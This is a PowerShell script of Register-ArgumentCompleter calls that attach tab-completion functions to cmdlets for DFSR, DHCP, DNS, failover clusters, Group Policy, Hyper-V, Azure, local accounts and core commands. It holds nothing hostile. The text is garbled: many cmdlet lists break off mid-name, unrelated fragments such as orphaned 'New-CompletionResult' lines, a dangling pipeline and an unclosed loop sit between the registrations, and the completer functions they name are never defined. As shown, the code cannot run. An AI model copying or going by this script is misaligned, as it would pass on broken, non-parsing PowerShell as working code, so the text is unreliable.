Register-ArgumentCompleter ` -Command ( 'Add-DfsrConnection' , 'Add-DfsrMember' , 'ConvertFrom-DfsrGuid' , 'Get-DfsrBacklog' , 'Get-DfsrConnection' , 'Get-DfsrConnectionSchedule' , 'Get-DfsReplicatedFolder' , 'Get-DfsReplicationGroup' , 'Get-DfsrGroupSchedule' , 'Get-DfsrMember' , 'Get-DfsrMembership' , 'New-DfsReplicatedFolder' , 'New-DfsReplicationGroup' , 'Remove-DfsrConnection' , 'Remove-DfsReplicatedFolder' , 'Remove-DfsReplicationGroup' , 'Remove-DfsrMember' , 'Remove-DfsrPropagationTestFile' , 'Set-DfsrConnection' , 'Set-DfsrConnectionSchedule' , 'Set-DfsReplicatedFolder' , 'Set-DfsReplicationGroup' , 'Set-DfsrGroupSchedule' , 'Set-DfsrMember' , 'Set-DfsrMembership' , 'Start-DfsrPropagationTest' , 'Suspend-DfsReplicationGroup' , 'Sync-DfsReplicationGroup' , 'Write-DfsrHealthReport' , 'Write-DfsrPropagationReport' ) ` -Parameter 'GroupName' ` -ScriptBlock $function:DFSR_GroupNameArgumentCompletion
Set-CompletionPrivateData -Key $CacheKey -Value $List -ExpirationSeconds 900 # Expiration: 15 min
Register-ArgumentCompleter ` -Command ( 'Reconcile-DhcpServerv4IPRecord' , 'Add-DhcpServerSecurityGroup' , 'Add-DhcpServerv4Class' , 'Add-DhcpServerv4ExclusionRange' , 'Add-DhcpServerv4Failover' , 'Add-DhcpServerv4FailoverScope' , 'Add-DhcpServerv4Filter' , 'Add-DhcpServerv4Lease' , 'Add-DhcpServerv4MulticastExclusionRange' , 'Add-DhcpServerv4MulticastScope' , 'Add-DhcpServerv4OptionDefinition' , 'Add-DhcpServerv4Policy' , 'Add-DhcpServerv4PolicyIPRange' , 'Add-DhcpServerv4Reservation' , 'Add-DhcpServerv4Scope' , 'Add-DhcpServerv4Superscope' , 'Add-DhcpServerv6Class' , 'Add-DhcpServerv6ExclusionRange' , 'Add-DhcpServerv6Lease' , 'Add-DhcpServerv6OptionDefinition' , 'Add-DhcpServerv6Reservation' , 'Add-DhcpServerv6Scope' , 'Backup-DhcpServer' , 'Export-DhcpServer' , 'Get-DhcpServerAuditLog' , 'Get-DhcpServerDatabase' , 'Get-DhcpServerDnsCredential' , 'Get-DhcpServerSetting' , 'Get-DhcpServerv4Binding' , 'Get-DhcpServerv4Class' , 'Get-DhcpServerv4DnsSetting' , 'Get-DhcpServerv4ExclusionRange' , 'Get-DhcpServer
Register-ArgumentCompleter ` -Command ( 'Reconcile-DhcpServerv4IPRecord' , 'Add-DhcpServerInDC' , 'Add-DhcpServerSecurityGroup' , 'Add-DhcpServerv4Class' , 'Add-DhcpServerv4ExclusionRange' , 'Add-DhcpServerv4Failover' , 'Add-DhcpServerv4FailoverScope' , 'Add-DhcpServerv4Filter' , 'Add-DhcpServerv4Lease' , 'Add-DhcpServerv4MulticastExclusionRange' , 'Add-DhcpServerv4MulticastScope' , 'Add-DhcpServerv4OptionDefinition' , 'Add-DhcpServerv4Policy' , 'Add-DhcpServerv4PolicyIPRange' , 'Add-DhcpServerv4Reservation' , 'Add-DhcpServerv4Scope' , 'Add-DhcpServerv4Superscope' , 'Add-DhcpServerv6Class' , 'Add-DhcpServerv6ExclusionRange' , 'Add-DhcpServerv6Lease' , 'Add-DhcpServerv6OptionDefinition' , 'Add-DhcpServerv6Reservation' , 'Add-DhcpServerv6Scope' , 'Backup-DhcpServer' , 'Export-DhcpServer' , 'Get-DhcpServerAuditLog' , 'Get-DhcpServerDatabase' , 'Get-DhcpServerDnsCredential' , 'Get-DhcpServerInDC' , 'Get-DhcpServerSetting' , 'Get-DhcpServerv4Binding' , 'Get-DhcpServerv4Class' , 'Get-DhcpServerv4DnsSetting' , 'Get
Register-ArgumentCompleter ` -Command ( 'Get-DhcpServerv4DnsSetting' , 'Get-DhcpServerv4ExclusionRange' , 'Get-DhcpServerv4Failover' , 'Get-DhcpServerv4FreeIPAddress' , 'Get-DhcpServerv4Lease' , 'Get-DhcpServerv4OptionValue' , 'Get-DhcpServerv4Policy' , 'Get-DhcpServerv4PolicyIPRange' , 'Get-DhcpServerv4Reservation' , 'Get-DhcpServerv4Scope' , 'Get-DhcpServerv4ScopeStatistics' ) ` -Parameter 'ScopeId' ` -ScriptBlock $function:DhcpServer_v4ScopeIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DhcpServerv4PolicyIPRange' , 'Get-DhcpServerv4Policy' , 'Get-DhcpServerv4PolicyIPRange' , 'Remove-DhcpServerv4Policy' , 'Remove-DhcpServerv4PolicyIPRange' , 'Set-DhcpServerv4Policy' ) ` -Parameter 'Name' ` -ScriptBlock $function:DhcpServer_v4PolicyNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-DhcpServerv4Class' ) ` -Parameter 'Name' ` -ScriptBlock $function:DhcpServer_v4ClassNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-DhcpServerv6Class' ) ` -Parameter 'Name' ` -ScriptBlock $function:DhcpServer_v6ClassNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DhcpServerv4OptionDefinition' , 'Add-DhcpServerv4Policy' , 'Get-DhcpServerv4OptionDefinition' , 'Get-DhcpServerv4OptionValue' , 'Remove-DhcpServerv4OptionDefinition' , 'Remove-DhcpServerv4OptionValue' , 'Set-DhcpServerv4OptionDefinition' , 'Set-DhcpServerv4OptionValue' , 'Set-DhcpServerv4Policy' ) ` -Parameter 'VendorClass' ` -ScriptBlock $function:DhcpServer_v4ClassNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DhcpServerv6OptionDefinition' , 'Get-DhcpServerv6OptionDefinition' , 'Get-DhcpServerv6OptionValue' , 'Remove-DhcpServerv6OptionDefinition' , 'Remove-DhcpServerv6OptionValue' , 'Set-DhcpServerv6OptionDefinition' , 'Set-DhcpServerv6OptionValue' ) ` -Parameter 'VendorClass' ` -ScriptBlock $function:DhcpServer_v6ClassNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DhcpServerv4Policy' , 'Get-DhcpServerv4OptionValue' , 'Remove-DhcpServerv4OptionValue' , 'Set-DhcpServerv4OptionValue' , 'Set-DhcpServerv4Policy' ) ` -Parameter 'UserClass' ` -ScriptBlock $function:DhcpServer_v4ClassNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-DhcpServerv6OptionValue' , 'Remove-DhcpServerv6OptionValue' , 'Set-DhcpServerv6OptionValue' ) ` -Parameter 'UserClass' ` -ScriptBlock $function:DhcpServer_v6ClassNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DhcpServerv4OptionDefinition' , 'Get-DhcpServerv4OptionDefinition' , 'Get-DhcpServerv4OptionValue' , 'Remove-DhcpServerv4OptionDefinition' , 'Remove-DhcpServerv4OptionValue' , 'Set-DhcpServerv4OptionDefinition' , 'Set-DhcpServerv4OptionValue' ) ` -Parameter 'OptionId' ` -ScriptBlock $function:DhcpServer_v4OptionIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DhcpServerv6OptionDefinition' , 'Get-DhcpServerv6OptionDefinition' , 'Get-DhcpServerv6OptionValue' , 'Remove-DhcpServerv6OptionDefinition' , 'Remove-DhcpServerv6OptionValue' , 'Set-DhcpServerv6OptionDefinition' , 'Set-DhcpServerv6OptionValue' ) ` -Parameter 'OptionId' ` -ScriptBlock $function:DhcpServer_v6OptionIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Disable-WindowsOptionalFeature' , 'Enable-WindowsOptionalFeature' , 'Get-WindowsOptionalFeature' ) ` -Parameter 'FeatureName' ` -ScriptBlock $function:Dism_WindowsOptionalFeatureNameCompleter
Register-ArgumentCompleter ` -Command ( 'Get-DnsClient' , 'Get-DnsClientServerAddress' , 'Set-DnsClient' , 'Set-DnsClientServerAddress' ) ` -Parameter 'InterfaceAlias' ` -ScriptBlock $function:DnsClientInterfaceAliasParameterCompleter
DnsServer\Get-DnsServerResourceRecord @optionalParams |
Register-ArgumentCompleter ` -Command ( 'Add-DnsServerConditionalForwarderZone' , 'Add-DnsServerPrimaryZone' , 'Add-DnsServerResourceRecord' , 'Add-DnsServerResourceRecordA' , 'Add-DnsServerResourceRecordAAAA' , 'Add-DnsServerResourceRecordCName' , 'Add-DnsServerResourceRecordDnsKey' , 'Add-DnsServerResourceRecordDS' , 'Add-DnsServerResourceRecordMX' , 'Add-DnsServerResourceRecordPtr' , 'Add-DnsServerSecondaryZone' , 'Add-DnsServerSigningKey' , 'Add-DnsServerStubZone' , 'Add-DnsServerZoneDelegation' , 'Clear-DnsServerStatistics' , 'ConvertTo-DnsServerPrimaryZone' , 'ConvertTo-DnsServerSecondaryZone' , 'Disable-DnsServerSigningKeyRollover' , 'Enable-DnsServerSigningKeyRollover' , 'Export-DnsServerDnsSecPublicKey' , 'Export-DnsServerZone' , 'Get-DnsServerDnsSecZoneSetting' , 'Get-DnsServerResourceRecord' , 'Get-DnsServerSigningKey' , 'Get-DnsServerStatistics' , 'Get-DnsServerZone' , 'Get-DnsServerZoneAging' , 'Get-DnsServerZoneDelegation' , 'Import-DnsServerResourceRecordDS' , 'Invoke-DnsServerSigningKeyRollov
Register-ArgumentCompleter ` -Command ( 'Get-DnsServerResourceRecord' ) ` -Parameter 'Name' ` -ScriptBlock $function:DNSServer_ResourceRecordNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-DnsServerConditionalForwarderZone' , 'Add-DnsServerDirectoryPartition' , 'Add-DnsServerPrimaryZone' , 'Add-DnsServerStubZone' , 'ConvertTo-DnsServerPrimaryZone' , 'Get-DnsServerDirectoryPartition' , 'Register-DnsServerDirectoryPartition' , 'Remove-DnsServerDirectoryPartition' , 'Set-DnsServerConditionalForwarderZone' , 'Set-DnsServerPrimaryZone' , 'Set-DnsServerStubZone' , 'Unregister-DnsServerDirectoryPartition' ) ` -Parameter 'DirectoryPartitionName' ` -ScriptBlock $function:DNSServer_DirectoryPartitionNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-DnsServerDirectoryPartition' ) ` -Parameter 'Name' ` -ScriptBlock $function:DNSServer_DirectoryPartitionNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-Cluster' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-VMToCluster' , 'Remove-VMFromCluster' , 'Add-ClusterCheckpoint' , 'Add-ClusterDisk' , 'Add-ClusterFileServerRole' , 'Add-ClusterGenericApplicationRole' , 'Add-ClusterGenericScriptRole' , 'Add-ClusterGenericServiceRole' , 'Add-ClusterGroup' , 'Add-ClusteriSCSITargetServerRole' , 'Add-ClusterNode' , 'Add-ClusterPrintServerRole' , 'Add-ClusterResource' , 'Add-ClusterResourceDependency' , 'Add-ClusterResourceType' , 'Add-ClusterScaleOutFileServerRole' , 'Add-ClusterServerRole' , 'Add-ClusterSharedVolume' , 'Add-ClusterVirtualMachineRole' , 'Add-ClusterVMMonitoredItem' , 'Block-ClusterAccess' , 'Clear-ClusterNode' , 'Get-ClusterAccess' , 'Get-ClusterAvailableDisk' , 'Get-ClusterCheckpoint' , 'Get-ClusterGroup' , 'Get-ClusterLog' , 'Get-ClusterNetwork' , 'Get-ClusterResource' , 'Get-ClusterNetworkInterface' , 'Get-ClusterNode' , 'Get-ClusterOwnerNode' , 'Get-ClusterParameter' , 'Get-ClusterQuorum' , 'Get-ClusterResource' , 'Get-ClusterResourceDependency' , 'Get-ClusterR
Register-ArgumentCompleter ` -Command ( 'Clear-ClusterDiskReservation' , 'Get-ClusterLog' , 'Get-ClusterNetworkInterface' , 'Get-ClusterSharedVolumeState' , 'Move-ClusterGroup' , 'Move-ClusterSharedVolume' , 'Move-ClusterVirtualMachineRole' , 'New-Cluster' , 'Test-Cluster' ) ` -Parameter 'Node' ` -ScriptBlock $function:FailoverClusters_ClusterNodeArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Clear-ClusterNode' , 'Get-ClusterNode' , 'Remove-ClusterNode' , 'Resume-ClusterNode' , 'Start-ClusterNode' , 'Stop-ClusterNode' , 'Suspend-ClusterNode' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterNodeArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-ClusterGroup' , 'Get-ClusterGroup' , 'Move-ClusterGroup' , 'Move-ClusterVirtualMachineRole' , 'Remove-ClusterGroup' , 'Start-ClusterGroup' , 'Stop-ClusterGroup' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterGroupNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterGroup' , 'Remove-ClusterGroup' ) ` -Parameter 'VMId' ` -ScriptBlock $function:FailoverClusters_ClusterGroupVMIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterOwnerNode' , 'Set-ClusterOwnerNode' ) ` -Parameter 'Group' ` -ScriptBlock $function:FailoverClusters_ClusterGroupNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Move-ClusterVirtualMachineRole' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterVirtualMachineRoleNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Move-ClusterVirtualMachineRole' ) ` -Parameter 'VMId' ` -ScriptBlock $function:FailoverClusters_ClusterVirtualMachineRoleVMIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterResource' , 'Move-ClusterResource' , 'Remove-ClusterResource' , 'Start-ClusterResource' , 'Stop-ClusterResource' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterResourceNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterResource' ) ` -Parameter 'VMId' ` -ScriptBlock $function:FailoverClusters_ClusterResourceVMIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Move-ClusterResource' ) ` -Parameter 'Group' ` -ScriptBlock $function:FailoverClusters_ClusterGroupNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Resume-ClusterResource' , 'Supsend-ClusterResource' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterResourceDiskArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Resume-ClusterResource' , 'Supsend-ClusterResource' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterSharedVolumeNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterResourceType' , 'Remove-ClusterResourceType' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterResourceTypeNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterOwnerNode' , 'Get-ClusterParameter' ) ` -Parameter 'ResourceType' ` -ScriptBlock $function:FailoverClusters_ClusterResourceTypeNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterSharedVolume' , 'Get-ClusterSharedVolumeState' , 'Move-ClusterSharedVolume' , 'Remove-ClusterSharedVolume' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterSharedVolumeNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-ClusterFileServerRole' , 'Add-ClusterGenericApplicationRole' , 'Add-ClusterGenericScriptRole' , 'Add-ClusterGenericServiceRole' , 'Add-ClusteriSCSITargetServerRole' , 'Add-ClusterPrintServerRole' , 'Add-ClusterServerRole' ) ` -Parameter 'Storage' ` -ScriptBlock $function:FailoverClusters_StorageArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterNetwork' ) ` -Parameter 'Name' ` -ScriptBlock $function:FailoverClusters_ClusterNetworkNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-ClusterNetworkInterface' ) ` -Parameter 'Network' ` -ScriptBlock $function:FailoverClusters_ClusterNetworkNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-GPO' , 'Get-GPOReport' , 'Get-GPPermission' , 'Get-GPPrefRegistryValue' , 'Get-GPRegistryValue' , 'Backup-GPO' , 'New-GPLink' , 'Remove-GPLink' , 'Remove-GPO' , 'Remove-GPPrefRegistryValue' , 'Remove-GPRegistryValue' , 'Rename-GPO' , 'Set-GPLink' , 'Get-GPPermission' , 'Set-GPPrefRegistryValue' , 'Set-GPRegistryValue' ) ` -Parameter 'Name' ` -ScriptBlock $function:GroupPolicy_GPONameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-GPO' , 'Get-GPOReport' , 'Get-GPPermission' , 'Get-GPPrefRegistryValue' , 'Get-GPRegistryValue' , 'Backup-GPO' , 'New-GPLink' , 'Remove-GPLink' , 'Remove-GPO' , 'Remove-GPPrefRegistryValue' , 'Remove-GPRegistryValue' , 'Rename-GPO' , 'Set-GPLink' , 'Get-GPPermission' , 'Set-GPPrefRegistryValue' , 'Set-GPRegistryValue' ) ` -Parameter 'GUID' ` -ScriptBlock $function:GroupPolicy_GPOGUIDArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-GPStarterGPO' ) ` -Parameter 'Name' ` -ScriptBlock $function:GroupPolicy_StarterGPONameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-GPStarterGPO' ) ` -Parameter 'GUID' ` -ScriptBlock $function:GroupPolicy_StarterGPOGUIDArgumentCompletion
New-CompletionResult $_ . Name
Register-ArgumentCompleter ` -Command ( 'Checkpoint-VM' , 'Compare-VM' , 'Debug-VM' , 'Export-VM' , 'Get-VM' , 'Measure-VM' , 'Move-VM' , 'New-VM' , 'Remove-VM' , 'Rename-VM' , 'Restart-VM' , 'Resume-VM' , 'Save-VM' , 'Set-VM' , 'Start-VM' , 'Stop-VM' , 'Suspend-VM' ) ` -Parameter 'Name' ` -ScriptBlock $function:HyperV_VMNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-VMDvdDrive' , 'Add-VMFibreChannelHba' , 'Add-VMHardDiskDrive' , 'Add-VMNetworkAdapter' , 'Add-VMNetworkAdapterAcl' , 'Add-VMNetworkAdapterExtendedAcl' , 'Add-VmNetworkAdapterRoutingDomainMapping' , 'Add-VMRemoteFx3dVideoAdapter' , 'Add-VMScsiController' , 'Add-VMSwitchExtensionPortFeature' , 'Complete-VMFailover' , 'Connect-VMNetworkAdapter' , 'Disable-VMIntegrationService' , 'Disable-VMResourceMetering' , 'Disconnect-VMNetworkAdapter' , 'Enable-VMIntegrationService' , 'Enable-VMReplication' , 'Enable-VMResourceMetering' , 'Export-VMSnapshot' , 'Get-VMBios' , 'Get-VMComPort' , 'Get-VMConnectAccess' , 'Get-VMDvdDrive' , 'Get-VMFibreChannelHba' , 'Get-VMFirmware' , 'Get-VMFloppyDiskDrive' , 'Get-VMHardDiskDrive' , 'Get-VMIdeController' , 'Get-VMIntegrationService' , 'Get-VMMemory' , 'Get-VMNetworkAdapter' , 'Get-VMNetworkAdapterAcl' , 'Get-VMNetworkAdapterExtendedAcl' , 'Get-VMNetworkAdapterFailoverConfiguration' , 'Get-VmNetworkAdapterIsolation' , 'Get-VMNetworkAda
Register-ArgumentCompleter ` -Command ( 'Get-VMSwitch' , 'Remove-VMSwitch' , 'Rename-VMSwitch' , 'Set-VMSwitch' ) ` -Parameter 'Name' ` -ScriptBlock $function:HyperV_VMSwitchArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-VMNetworkAdapter' , 'Add-VMSwitchExtensionPortFeature' , 'Add-VMSwitchExtensionSwitchFeature' , 'Connect-VMNetworkAdapter' , 'Get-VMNetworkAdapter' , 'Get-VMSwitchExtensionPortData' , 'Get-VMSwitchExtensionPortFeature' , 'Get-VMSwitchExtensionSwitchData' , 'Get-VMSwitchExtensionSwitchFeature' , 'New-VM' , 'Remove-VMNetworkAdapter' , 'Remove-VMSwitchExtensionPortFeature' , 'Remove-VMSwitchExtensionSwitchFeature' , 'Set-VMSwitchExtensionPortFeature' , 'Set-VMSwitchExtensionSwitchFeature' ) ` -Parameter 'SwitchName' ` -ScriptBlock $function:HyperV_VMSwitchArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Disable-VMIntegrationService' , 'Enable-VMIntegrationService' , 'Get-VMIntegrationService' ) ` -Parameter 'Name' ` -ScriptBlock $function:HyperV_VMIntegrationServiceNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Convert-VHD' , 'Dismount-VHD' , 'Get-VHD' , 'Merge-VHD' , 'Mount-VHD' , 'Optimize-VHD' , 'Resize-VHD' , 'Set-VHD' , 'Test-VHD' ) ` -Parameter 'Path' ` -ScriptBlock $function:HyperV_VHDPathArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Connect-VMNetworkAdapter' , 'Disconnect-VMNetworkAdapter' , 'Get-VMNetworkAdapter' , 'Remove-VMNetworkAdapter' , 'Rename-VMNetworkAdapter' , 'Set-VMNetworkAdapter' , 'Test-VMNetworkAdapter' ) ` -Parameter 'Name' ` -ScriptBlock $function:HyperV_VMNetworkAdapterNameArgumentCompletion
Register-ArgumentCompleter ` -Command 'Import-IseSnippet' ` -Parameter 'Module' ` -ScriptBlock $function:IseSnippetModuleCompleter
Set-CompletionPrivateData -Key $CacheKey -Value $ItemList
Register-ArgumentCompleter ` -Command ( 'Enable-WAPackWebsiteApplicationDiagnositc' , 'Add-AzureHDInsightStorage' , 'Enable-AzureWebsiteApplicationDiagnostic' , 'Get-AzureStorageAccount' , 'Get-AzureStorageKey' , 'New-AzureMediaServicesAccount' , 'New-AzureStorageAccount' , 'New-AzureStorageContext' , 'New-AzureStorageKey' , 'Publish-AzureServiceProject' , 'Remove-AzureStorageAccount' , 'Set-AzureHDInsightDefaultStorage' , 'Set-AzureStorageAccount' , 'Set-AzureVMCustomScriptExtension' ) ` -Parameter 'StorageAccountName' ` -ScriptBlock $function:StorageAccount_StorageAccountNameCompleter
Register-ArgumentCompleter ` -Command ( 'Get-AzureStorageContainerAcl' , 'Get-AzureSiteRecoveryProtectionContainer' , 'Get-AzureStorageContainer' , 'New-AzureStorageContainer' , 'New-AzureStorageContainerSASToken' , 'Remove-AzureStorageContainer' , 'Set-AzureStorageContainerAcl' ) ` -Parameter 'Name' ` -ScriptBlock $function:AzureStorage_StorageContainerNameCompleter
Register-ArgumentCompleter ` -Command ( 'Add-AzureCertificate' , 'Add-AzureDns' , 'Add-AzureInternalLoadBalancer' , 'Export-AzureVM' , 'Get-AzureCertificate' , 'Get-AzureDeployment' , 'Get-AzureDeploymentEvent' , 'Get-AzureInternalLoadBalancer' , 'Get-AzureRemoteDesktopFile' , 'Get-AzureRole' , 'Get-AzureService' , 'Get-AzureServiceADDomainExtension' , 'Get-AzureServiceAntimalwareConfig' , 'Get-AzureServiceDiagnosticsExtension' , 'Get-AzureServiceExtension' , 'Get-AzureServiceRemoteDesktopExtension' , 'Get-AzureVM' , 'Get-AzureWinRMUri' , 'Move-AzureDeployment' , 'New-AzureDeployment' , 'New-AzureQuickVM' , 'New-AzureService' , 'New-AzureServiceProject' , 'New-AzureVM' , 'Publish-AzureServiceProject' , 'Remove-AzureCertificate' , 'Remove-AzureDeployment' , 'Remove-AzureDns' , 'Remove-AzureInternalLoadBalancer' , 'Remove-AzureService' , 'Remove-AzureServiceADDomainExtension' , 'Remove-AzureServiceAntimalwareExtension' , 'Remove-AzureServiceDiagnosticsExtension' , 'Remove-AzureServiceExtension' , 'Remove-Azure
Register-ArgumentCompleter ` -Command ( 'Get-WAPackSubscription' , 'Remove-WAPackSubscription' , 'Select-WAPackSubscription' , 'Set-WAPackSubscription' , 'Get-AzureSubscription' , 'New-AzureSqlDatabaseServerContext' , 'Remove-AzureSubscription' , 'Select-AzureSubscription' , 'Set-AzureSubscription' ) ` -Parameter 'SubscriptionName' ` -ScriptBlock $function:Subscription_SubscriptionNameCompleter
Register-ArgumentCompleter ` -Command ( 'Export-AzureVM' , 'Get-AzureVM' , 'Remove-AzureVM' , 'Restart-AzureVM' , 'Start-AzureVM' , 'Stop-AzureVM' , 'Update-AzureVM' ) ` -Parameter 'Name' ` -ScriptBlock $function:AzureVirtualMachine_NameCompleter
Set-CompletionPrivateData -Key $CacheKey -Value $ItemList
Register-ArgumentCompleter ` -Command ( 'Add-AlertRule' , 'Add-AutoscaleSetting' , 'Add-AzureRmApiManagementRegion' , 'Get-AzureRMAppServicePlan' , 'Get-AzureRmBatchSubscriptionQuotas' , 'Get-AzureRmHDInsightProperties' , 'Get-AzureRmResourceGroup' , 'Get-AzureRmResourceProvider' , 'Get-AzureRmStreamAnalyticsQuota' , 'Get-AzureRmVmExtensionImage' , 'Get-AzureRmVMExtensionImageType' , 'Get-AzureRmVMImage' , 'Get-AzureRmVMImageOffer' , 'Get-AzureRmVMImagePublisher' , 'Get-AzureRmVMImageSku' , 'Get-AzureRmVMSize' , 'Get-AzureRmVMUsage' , 'Get-AzureRMWebApp' , 'New-AzureRmApiManagement' , 'New-AzureRmApiManagementVirtualNetwork' , 'New-AzureRmApplicationGateway' , 'New-AzureRMAppServicePlan' , 'New-AzureRmAutomationAccount' , 'New-AzureRmAvailabilitySet' , 'New-AzureRmBatchAccount' , 'New-AzureRmDataFactory' , 'New-AzureRmDataLakeAnalyticsAccount' , 'New-AzureRmDataLakeStoreAccount' , 'New-AzureRmExpressRouteCircuit' , 'New-AzureRmHDInsightCluster' , 'New-AzureRmKeyVault' , 'New-AzureRmLoadBalancer' , 'New-Azure
New-CompletionResult $_
Microsoft.PowerShell.Management\Get-ChildItem -Path "$wordToComplete*" -Directory | Sort-Object Name | ForEach-Object {
Register-ArgumentCompleter ` -Command ( 'help' , 'Get-Help' ) ` -Parameter 'Parameter' ` -ScriptBlock $function:HelpParameterNameCompletion
Register-ArgumentCompleter ` -Command 'Get-PSSnapin' ` -Parameter 'Name' ` -ScriptBlock $function:GetSnapinCompletion
Register-ArgumentCompleter ` -Command 'Add-PSSnapin' ` -Parameter 'Name' ` -ScriptBlock $function:AddSnapinCompletion
Register-ArgumentCompleter ` -Command 'Get-Command' ` -Parameter 'Verb' ` -ScriptBlock $function:VerbCompletion
Register-ArgumentCompleter ` -Command 'Get-Command' ` -Parameter 'Noun' ` -ScriptBlock $function:NounCompletion
Register-ArgumentCompleter ` -Command 'Set-Strictmode' ` -Parameter 'Version' ` -ScriptBlock $function:SetStrictMode_VersionCompleter
Register-ArgumentCompleter ` -Command ( 'Save-Help' , 'Update-Help' ) ` -Parameter 'Module' ` -ScriptBlock $function:HelpModuleCompleter
Register-ArgumentCompleter ` -Command ( 'Clear-Variable' , 'Export-Alias' , 'Get-Alias' , 'Get-PSDrive' , 'Get-Variable' , 'Import-Alias' , 'Import-Module' , 'New-Alias' , 'New-PSDrive' , 'New-Variable' , 'Remove-PSDrive' , 'Remove-Variable' , 'Set-Alias' , 'Set-Variable' ) ` -Parameter 'Scope' ` -ScriptBlock $function:ScopeParameterCompleter
Register-ArgumentCompleter ` -Command ( 'help' , 'Get-Help' ) ` -Parameter 'Name' ` -ScriptBlock $function:HelpNameCompletion
Register-ArgumentCompleter ` -Command 'Import-Module' ` -Parameter 'Name' ` -ScriptBlock $function:ImportModuleNameCompleter
New-CompletionResult $_
Register-ArgumentCompleter ` -Command 'Get-WinEvent' ` -Parameter 'LogName' ` -ScriptBlock $function:GetWinEvent_LogNameCompleter
Register-ArgumentCompleter ` -Command 'Get-WinEvent' ` -Parameter 'ListLog' ` -ScriptBlock $function:GetWinEvent_ListLogCompleter
Register-ArgumentCompleter ` -Command 'Get-WinEvent' ` -Parameter 'ListProvider' ` -ScriptBlock $function:GetWinEvent_ListProviderCompleter
Register-ArgumentCompleter ` -Command ( 'Disable-LocalUser' , 'Enable-LocalUser' , 'Get-LocalUser' , 'Remove-LocalUser' , 'Rename-LocalUser' , 'Set-LocalUser' ) ` -Parameter 'Name' ` -ScriptBlock $function:LocalAccounts_LocalUserNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-LocalGroup' , 'Remove-LocalGroup' , 'Rename-LocalGroup' , 'Set-LocalGroup' ) ` -Parameter 'Name' ` -ScriptBlock $function:LocalAccounts_LocalGroupNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-LocalGroup' , 'Remove-LocalGroup' , 'Rename-LocalGroup' , 'Set-LocalGroup' ) ` -Parameter 'SID' ` -ScriptBlock $function:LocalAccounts_LocalGroupSIDArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-LocalGroupMember' , 'Get-LocalGroupMember' , 'Remove-LocalGroupMember' ) ` -Parameter 'Name' ` -ScriptBlock $function:LocalAccounts_LocalGroupNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-LocalGroupMember' , 'Get-LocalGroupMember' , 'Remove-LocalGroupMember' ) ` -Parameter 'SID' ` -ScriptBlock $function:LocalAccounts_LocalGroupSIDArgumentCompletion
New-CompletionResult $_
Register-ArgumentCompleter ` -Command ( 'Get-WmiObject' , 'Invoke-WmiMethod' , 'Register-WmiEvent' , 'Remove-WmiObject' , 'Set-WmiInstance' ) ` -Parameter 'Namespace' ` -ScriptBlock $function:WmiNamespaceCompleter
Register-ArgumentCompleter ` -Command ( 'Get-ControlPanelItem' , 'Show-ControlPanelItem' ) ` -Parameter 'Name' ` -ScriptBlock $function:ControlPanelItemNameCompleter
Register-ArgumentCompleter ` -Command ( 'Get-ControlPanelItem' , 'Show-ControlPanelItem' ) ` -Parameter 'CanonicalName' ` -ScriptBlock $function:ControlPanelItemCanonicalNameCompleter
Register-ArgumentCompleter ` -Command 'New-Object' ` -Parameter 'ComObject' ` -ScriptBlock $function:NewComObjectCompletion
